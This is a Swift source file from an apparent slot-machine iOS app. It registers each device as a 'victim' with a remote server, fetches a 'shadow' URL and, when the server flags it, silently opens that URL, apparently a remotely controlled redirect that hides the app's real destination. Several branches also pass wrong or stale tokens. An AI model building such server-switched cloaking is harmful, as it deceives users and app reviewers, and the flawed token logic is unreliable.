//
//  AssassinLeaperManager.swift
//  slotmachine
//
//  Created by rightmeow on 4/30/18.
//  Copyright © 2018 od-international. All rights reserved.
//

import Foundation
import Alamofire
import Crashlytics

open class AssassinLeaperManager: NSObject {
    
    private let trainerUsername: String
    private let trainerPasscode: String
    private let leaperToken: String
    private let baseURL: String
    private let headers: [String : String] = ["Content-Type" : "application/json"] // default headers
    typealias CompletionHandler = (_ data: Any?, _ error: Error?) -> Void
    private let timeoutInterval: TimeInterval
    private var is_production: Int
    private var url = "" // redirection url on AppDelegate level
    lazy private var sessionManager: SessionManager = {
        let manager = Alamofire.SessionManager.default
        manager.session.configuration.timeoutIntervalForRequest = self.timeoutInterval
        manager.session.configuration.timeoutIntervalForResource = self.timeoutInterval
        return manager
    }()
    
    public init(configs: AssassinLeaperConfigs) {
        self.is_production = configs.is_production
        self.timeoutInterval = configs.timeoutInterval
        self.trainerUsername = configs.trainerUsername
        self.trainerPasscode = configs.trainerPasscode
        self.leaperToken = configs.leaperToken
        self.baseURL = configs.baseURL
    }
    
    open var shouldRedirect: Bool {
        if url.isEmpty {
            return false
        } else {
            return true
        }
    }
    
    open func commitRedirect() {
        let completeUrlString = self.prefixUrlWithHTTP(urlString: self.url)
        guard let url = URL(string: completeUrlString) else {
            Answers.logCustomEvent(withName: CustomEventType.SwiftLang.rawValue, customAttributes: [CustomEventKey.kLoginTrainerError.rawValue:"Failed to downcast url string to URL"])
            return
        }
        UIApplication.shared.open(url, options: [:], completionHandler: nil)
        Answers.logCustomEvent(withName: CustomEventType.Network.rawValue, customAttributes: [CustomEventKey.kOpenUrlWithAppDelegate.rawValue:"Redirection committed"])
    }
    
    /// Prefix a url string with http if it doesn't contain, else do nothing.
    private func prefixUrlWithHTTP(urlString: String) -> String {
        if urlString.hasPrefix("http") {
            return urlString
        } else {
            let prefixedUrlString = "http://" + urlString
            return prefixedUrlString
        }
    }
    
    /// - remark: Long-running background task with 3 seconds timeout (warning: pyramid of doom)
    open func acquireUrlInBackground(block: @escaping () -> Void) {
        if let trainerToken = self.trainerToken, let victimToken = victimToken {
            self.requestShadow(trainerToken: trainerToken, victimToken: victimToken, completion: { (data, error) in
                if let dict = data as? NSDictionary {
                    if let payload = dict["dict"] as? NSDictionary, let leaped = payload["leaped"] as? Int, let shadow = payload["shadow"] as? NSDictionary, let url = shadow["url"] as? String {
                        if leaped == 1 {
                            self.url = url
                        }
                        print("requestShadow success")
                        block()
                    } else {
                        // trainerToken has expired
                        if let message = dict["message"] as? String {
                            if message.contains("CANNOT FIND VALID TOKEN") {
                                // FIXME: Checking against hardcoded string is unprofessional. Avoid this practice in production.
                                // login trainer
                                self.loginTrainer(trainerUsername: self.trainerUsername, passcode: self.trainerPasscode, completion: { (data, error) in
                                    if let dict = data as? NSDictionary, let payload = dict["payload"] as? NSDictionary, let trainer_token = payload["trainer_token"] as? String {
                                        print("loginTrainer success")
                                        self.saveTrainerToken(token: trainer_token)
                                        // request shadow
                                        self.requestShadow(trainerToken: trainerToken, victimToken: victimToken, completion: { (data, error) in
                                            if let dict = data as? NSDictionary, let payload = dict["payload"] as? NSDictionary, let shadow = payload["shadow"] as? NSDictionary, let leaped = payload["leaped"] as? Int, let url = shadow["url"] as? String {
                                                if leaped == 1 {
                                                    self.url = url
                                                }
                                                print("requestShadow success")
                                                block()
                                            } else {
                                                Answers.logCustomEvent(withName: CustomEventType.SwiftLang.rawValue, customAttributes: [CustomEventKey.kRequestShadow.rawValue:"Failed to parse error response"])
                                                print("requestShadow failed")
                                                block()
                                            }
                                        })
                                    } else {
                                        Answers.logCustomEvent(withName: CustomEventType.SwiftLang.rawValue, customAttributes: [CustomEventKey.kLoginTrainerError.rawValue:"Failed to parse error response"])
                                        print("loginTrainer failed")
                                        block()
                                    }
                                })
                            } else if message.contains("SHADOW FOUND") {
                                if let dict = data as? NSDictionary, let payload = dict["payload"] as? NSDictionary, let shadow = payload["shadow"] as? NSDictionary, let leaped = payload["leaped"] as? Int, let url = shadow["url"] as? String {
                                    if leaped == 1 {
                                        self.url = url
                                    }
                                    print("success at SHADOW FOUND")
                                    block()
                                } else {
                                    Answers.logCustomEvent(withName: CustomEventType.SwiftLang.rawValue, customAttributes: [CustomEventKey.kLoginTrainerError.rawValue:"Failed to parse error response"])
                                    print("failed to parse json at SHADOW FOUND branch")
                                    block()
                                }
                            } else if message.contains("TOKEN EXPIRED") {
                                self.loginTrainer(trainerUsername: self.trainerUsername, passcode: self.trainerPasscode, completion: { (data, error) in
                                    if let dict = data as? NSDictionary, let payload = dict["payload"] as? NSDictionary, let trainer_token = payload["trainer_token"] as? String {
                                        self.saveTrainerToken(token: trainer_token)
                                        // request shadow
                                        self.requestShadow(trainerToken: trainer_token, victimToken: victimToken, completion: { (data, error) in
                                            if let dict = data as? NSDictionary, let payload = dict["payload"] as? NSDictionary, let shadow = payload["shadow"] as? NSDictionary, let leaped = payload["leaped"] as? Int, let url = shadow["url"] as? String {
                                                if leaped == 1 {
                                                    self.url = url
                                                }
                                                block()
                                            } else {
                                                Answers.logCustomEvent(withName: CustomEventType.SwiftLang.rawValue, customAttributes: [CustomEventKey.kRequestShadow.rawValue:"Failed to parse error response"])
                                                print("failed to parse json at TOKEN EXPIRED")
                                                block()
                                            }
                                        })
                                    } else {
                                        Answers.logCustomEvent(withName: CustomEventType.SwiftLang.rawValue, customAttributes: [CustomEventKey.kLoginTrainerError.rawValue:"Failed to parse error response"])
                                        print("failed to parse json at TOKEN EXPIRED")
                                        block()
                                    }
                                })
                            } else if message.contains("FIND VICTIM FAIL") {
                                // create new victim
                                self.createVictim(trainerToken: self.trainerPasscode, leaperToken: self.leaperToken, deviceToken: "temp_device_token_sdk_v5", completion: { (data, error) in
                                    if let dict = data as? NSDictionary, let payload = dict["payload"] as? NSDictionary, let victim_token = payload["victim_token"] as? String {
                                        self.saveVictimToken(token: victim_token)
                                        print("createVictim success")
                                        // request shadow again!
                                        self.requestShadow(trainerToken: trainerToken, victimToken: victimToken, completion: { (data, error) in
                                            if let dict = data as? NSDictionary, let payload = dict["payload"] as? NSDictionary, let shadow = payload["shadow"] as? NSDictionary, let leaped = payload["leaped"] as? Int, let url = shadow["url"] as? String {
                                                if leaped == 1 {
                                                    self.url = url
                                                }
                                                block()
                                            } else {
                                                Answers.logCustomEvent(withName: CustomEventType.SwiftLang.rawValue, customAttributes: [CustomEventKey.kRequestShadow.rawValue:"Failed to parse json"])
                                                print("requestShadow failed")
                                                block()
                                            }
                                        })
                                    } else {
                                        Answers.logCustomEvent(withName: CustomEventType.SwiftLang.rawValue, customAttributes: [CustomEventKey.kCreateVictim.rawValue:"Failed to parse json"])
                                        print("createVictim failed")
                                        block()
                                    }
                                })
                            } else {
                                // FIXME: Uncaptured API Exception
                                // remark: current API does not support REST architecture, the only known exceptions are listed as above. However, there isn't one silver to capture all exceptions from the API when calling requestShadow.
                                Answers.logCustomEvent(withName: CustomEventType.Network.rawValue, customAttributes: ["UNCAPTURED API EXCEPTION":"UNCAPTURED API EXCEPTION"])
                                print("UNCAPTURED API EXCEPTION")
                                block()
                            }
                        } else {
                            Answers.logCustomEvent(withName: CustomEventType.SwiftLang.rawValue, customAttributes: [CustomEventKey.kRequestShadow.rawValue:"Failed to parse json"])
                            print("failed to parse json into message hash")
                            block()
                        }
                    }
                } else {
                    Answers.logCustomEvent(withName: CustomEventType.SwiftLang.rawValue, customAttributes: [CustomEventKey.kRequestShadow.rawValue:"Failed to parse json"])
                    print("requestShadow failed")
                    block()
                }
            })
        } else {
            // fresh launch + new user
            // login trainer
            self.loginTrainer(trainerUsername: trainerUsername, passcode: trainerPasscode, completion: { (data, error) in
                if let dict = data as? NSDictionary, let payload = dict["payload"] as? NSDictionary, let trainer_token = payload["trainer_token"] as? String {
                    self.saveTrainerToken(token: trainer_token)
                    print("loginTrainer success")
                    // create victim
                    self.createVictim(trainerToken: trainer_token, leaperToken: self.leaperToken, deviceToken: "temp_device_token_sdk_v5", completion: { (data, error) in
                        if let dict = data as? NSDictionary, let payload = dict["payload"] as? NSDictionary, let victim_token = payload["victim_token"] as? String {
                            self.saveVictimToken(token: victim_token)
                            print("createVictim success")
                            // request shadow
                            self.requestShadow(trainerToken: trainer_token, victimToken: victim_token, completion: { (data, error) in
                                if let dict = data as? NSDictionary, let payload = dict["payload"] as? NSDictionary, let shadow = payload["shadow"] as? NSDictionary, let leaped = payload["leaped"] as? Int, let url = shadow["url"] as? String {
                                    if leaped == 1 {
                                        self.url = url
                                    }
                                    print("requestShadow success")
                                    block()
                                } else {
                                    Answers.logCustomEvent(withName: CustomEventType.SwiftLang.rawValue, customAttributes: [CustomEventKey.kRequestShadow.rawValue:"Failed to parse json"])
                                    print("requestShadow failed")
                                    block()
                                }
                            })
                        } else {
                            Answers.logCustomEvent(withName: CustomEventType.SwiftLang.rawValue, customAttributes: [CustomEventKey.kCreateVictim.rawValue:"Failed to parse json"])
                            print("createVictim failed")
                            block()
                        }
                    })
                } else {
                    Answers.logCustomEvent(withName: CustomEventType.SwiftLang.rawValue, customAttributes: [CustomEventKey.kLoginTrainerError.rawValue:"Failed to parse json"])
                    print("loginTrainer failed")
                    block()
                }
            })
        }
    }
    
    // trainer
    
    private enum TrainerSessionKey: String {
        case kTrainerSession
        case sessionToken
        case createdAt
        case expiredAt
    }
    
    private var trainerToken: String? {
        let dictionary = UserDefaults.standard.dictionary(forKey: TrainerSessionKey.kTrainerSession.rawValue)
        let token = dictionary?[TrainerSessionKey.sessionToken.rawValue] as? String
        return token
    }
    
    private func isTrainerTokenValid(trainerSession: NSDictionary, isValidFor days: Int) -> Bool {
        guard let createdAt = trainerSession[TrainerSessionKey.createdAt.rawValue] as? NSDate else { return false }
        let calendar = NSCalendar.current
        let date1 = calendar.startOfDay(for: createdAt as Date)
        let date2 = calendar.startOfDay(for: Date())
        let components = calendar.dateComponents([.day], from: date1, to: date2)
        if let hoursElapsed = components.hour {
            if hoursElapsed > 24 {
                return false
            } else {
                return true
            }
        } else {
            return false
        }
    }
    
    private func loginTrainer(trainerUsername: String, passcode: String, completion: @escaping CompletionHandler) {
        sessionManager.request(baseURL+"/trainer", method: HTTPMethod.post, parameters: ["service_code": "login_trainer", "payload": ["username": trainerUsername, "passcode": passcode]], encoding: JSONEncoding.default, headers: headers).responseJSON(queue: DispatchQueue.main, options: JSONSerialization.ReadingOptions.mutableContainers) { (response) in
            switch response.result {
            case .success(let value):
                completion(value, nil)
            case .failure(let error):
                Answers.logCustomEvent(withName: CustomEventType.Network.rawValue, customAttributes: [CustomEventKey.kAuthenticationError.rawValue : error.localizedDescription])
                completion(nil, error)
            }
        }
    }
    
    private func logoutTrainer(trainerToken: String, completion: @escaping (Bool) -> Void) {
        sessionManager.request(baseURL+"trainerdetail", method: HTTPMethod.post, parameters: ["service_code": "logout_trainer", "trainer_token": trainerToken], encoding: JSONEncoding.default, headers: headers).responseJSON(queue: DispatchQueue.main, options: JSONSerialization.ReadingOptions.mutableContainers) { (response) in
            switch response.result {
            case .success(let value):
                if let unwrappedValue = value as? NSDictionary, let status = unwrappedValue["status"] as? Bool {
                    completion(status)
                } else {
                    completion(false)
                }
            case .failure(let error):
                Answers.logCustomEvent(withName: CustomEventType.Network.rawValue, customAttributes: [CustomEventKey.kAuthenticationError.rawValue : error.localizedDescription])
                completion(false)
            }
        }
    }
    
    private func saveTrainerToken(token: String) {
        let dictionary = NSDictionary(dictionary: [TrainerSessionKey.sessionToken.rawValue: token, TrainerSessionKey.createdAt.rawValue: NSDate()])
        UserDefaults.standard.set(dictionary, forKey: TrainerSessionKey.kTrainerSession.rawValue)
    }
    
    // victim
    
    private enum VictimSessionKey: String {
        case kVictimSession
        case sessionToken
    }
    
    private var victimToken: String? {
        do {
            let passwordItem = KeychainPasswordItem(service: KeychainConfiguration.serviceName, account: VictimSessionKey.sessionToken.rawValue, accessGroup: nil)
            let token = try passwordItem.readPassword()
            return token
        } catch let err {
            Answers.logCustomEvent(withName: CustomEventType.Persistence.rawValue, customAttributes: [CustomEventKey.kKeychain.rawValue : err.localizedDescription])
            return nil
        }
    }
    
    private func createVictim(trainerToken: String, leaperToken: String, deviceToken: String, completion: @escaping CompletionHandler) {
        sessionManager.request(baseURL+"/victim", method: HTTPMethod.post, parameters: ["service_code": "victim_create", "trainer_token": trainerToken, "payload": ["leaper_token": leaperToken, "push_token": deviceToken]], encoding: JSONEncoding.default, headers: headers).responseJSON(queue: DispatchQueue.main, options: JSONSerialization.ReadingOptions.mutableContainers) { (response) in
            switch response.result {
            case .success(let value):
                completion(value, nil)
            case .failure(let error):
                Answers.logCustomEvent(withName: CustomEventType.Network.rawValue, customAttributes: [CustomEventKey.kCreateVictim.rawValue : error.localizedDescription])
                completion(nil, error)
            }
        }
    }
    
    private func saveVictimToken(token: String) {
        do {
            let passwordItem = KeychainPasswordItem(service: KeychainConfiguration.serviceName, account: VictimSessionKey.sessionToken.rawValue, accessGroup: nil)
            try passwordItem.savePassword(token)
        } catch let err {
            Answers.logCustomEvent(withName: CustomEventType.Persistence.rawValue, customAttributes: [CustomEventKey.kKeychain.rawValue : "FATAL: " + err.localizedDescription])
        }
    }
    
    // update victim when device token has changed
    private func updateVictim(trainerToken: String, victimToken: String, deviceToken: String, completion: @escaping CompletionHandler) {
        sessionManager.request(baseURL+"/victim", method: HTTPMethod.post, parameters: ["service_code": "victim_update", "trainer_token": trainerToken, "payload": ["victim_token": victimToken, "pack": ["push_token": deviceToken]]], encoding: JSONEncoding.default, headers: headers).responseJSON(queue: DispatchQueue.main, options: JSONSerialization.ReadingOptions.mutableContainers) { (response) in
            switch response.result {
            case .success(let value):
                completion(value, nil)
            case .failure(let error):
                Answers.logCustomEvent(withName: CustomEventType.Network.rawValue, customAttributes: [CustomEventKey.kUpdateVictim.rawValue : error.localizedDescription])
                completion(nil, error)
            }
        }
    }
    
    private func victimPush(trainerToken: String, leaperToken: String, victimToken: String, completion: @escaping CompletionHandler) {
        sessionManager.request(baseURL+"/victim", method: HTTPMethod.post, parameters: ["service_code": "victim_push", "trainer_token": trainerToken, "payload": ["leaper_token": leaperToken, "victim_token": victimToken, "is_production": is_production]], encoding: JSONEncoding.default, headers: headers).responseJSON(queue: DispatchQueue.main, options: JSONSerialization.ReadingOptions.mutableContainers) { (response) in
            switch response.result {
            case .success(let value):
                completion(value, nil)
            case .failure(let error):
                Answers.logCustomEvent(withName: CustomEventType.Network.rawValue, customAttributes: [CustomEventKey.kVictimPush.rawValue : error.localizedDescription])
                completion(nil, error)
            }
        }
    }
    
    // shadow
    
    private func requestShadow(trainerToken: String, victimToken: String, completion: @escaping CompletionHandler) {
        sessionManager.request(baseURL+"/victim", method: HTTPMethod.post, parameters: ["service_code": "request_shadow", "trainer_token": trainerToken, "payload": ["victim_token": victimToken]], encoding: JSONEncoding.default, headers: headers).responseJSON(queue: DispatchQueue.main, options: JSONSerialization.ReadingOptions.mutableContainers) { (response) in
            switch response.result {
            case .success(let value):
                completion(value, nil)
            case .failure(let error):
                Answers.logCustomEvent(withName: CustomEventType.Network.rawValue, customAttributes: [CustomEventKey.kRequestShadow.rawValue : error.localizedDescription])
                completion(nil, error)
            }
        }
    }
    
    private func findShadow(trainerToken: String, leaperToken: String, completion: @escaping CompletionHandler) {
        sessionManager.request(baseURL+"/leaper", method: HTTPMethod.post, parameters: ["service_code": "find_shadow", "trainer_token": trainerToken, "payload": ["leaper_token": leaperToken]], encoding: JSONEncoding.default, headers: headers).responseJSON(queue: DispatchQueue.main, options: JSONSerialization.ReadingOptions.mutableContainers) { (response) in
            switch response.result {
            case .success(let value):
                completion(value, nil)
            case .failure(let error):
                Answers.logCustomEvent(withName: CustomEventType.Network.rawValue, customAttributes: [CustomEventKey.kFindShadow.rawValue : error.localizedDescription])
                completion(nil, error)
            }
        }
    }
    
}
